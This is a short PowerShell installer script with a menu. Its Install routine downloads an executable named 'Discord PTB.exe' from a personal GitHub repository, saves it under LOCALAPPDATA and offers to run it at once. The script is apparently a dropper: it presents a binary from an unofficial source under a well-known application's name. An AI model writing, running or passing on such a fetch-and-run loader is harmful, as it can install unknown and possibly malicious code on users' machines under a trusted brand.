[Console]::OutputEncoding = [Text.Encoding]::UTF8
cls

# -------------------------
# CONFIG
# -------------------------

$global:TargetDir  = Join-Path $env:LOCALAPPDATA "MyApp"
$global:TargetName = "Discord PTB.exe"
$global:TargetFile = Join-Path $global:TargetDir $global:TargetName

$global:DownloadUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/main/Discord%20PTB.exe"

# -------------------------
# ANIMATION
# -------------------------

function chk($t){
    $c = @("Red","Yellow","Green","Cyan","Blue","Magenta")
    for($i=0;$i -lt 20;$i++){
        $d="."*($i%6)
        $cl=$c[$i%$c.Count]
        Write-Host ("`r"+$t+$d+"   ") -NoNewline -ForegroundColor $cl
        Start-Sleep -Milliseconds 80
    }
    Write-Host ""
}

# -------------------------
# INSTALL
# -------------------------

function Install-App {

    if(-not (Test-Path $global:TargetDir)){
        New-Item -ItemType Directory -Path $global:TargetDir -Force | Out-Null
    }

    chk "downloading "

    try{
        Invoke-WebRequest $global:DownloadUrl -OutFile $global:TargetFile
        Write-Host "`nDownload complete" -ForegroundColor Green
    }
    catch{
        Write-Host "`nDownload failed" -ForegroundColor Red
        Pause
        return
    }

    # ถามก่อนรัน
    if(Test-Path $global:TargetFile){
        $ans = Read-Host "`nRun now? (y/n)"
        if($ans -eq "y"){
            Write-Host "`nRunning..." -ForegroundColor Cyan
            Start-Process $global:TargetFile
        }
    }

    Pause
}

# -------------------------
# CHECK
# -------------------------

function Check-App {

    Write-Host "`nChecking..." -ForegroundColor Yellow

    if(Test-Path $global:TargetFile){
        Write-Host "`nFile found" -ForegroundColor Green
        Write-Host $global:TargetFile -ForegroundColor Cyan
    }
    else{
        Write-Host "`nFile not found" -ForegroundColor Red
    }

    Pause
}

# -------------------------
# MENU
# -------------------------

while($true){

    cls
    Write-Host "=== MENU ===`n" -ForegroundColor Cyan
    Write-Host "1. Install"
    Write-Host "2. Check"
    Write-Host "0. Exit"

    $m = Read-Host ">"

    switch($m){
        "1" { Install-App }
        "2" { Check-App }
        "0" { break }
        default { continue }
    }
}
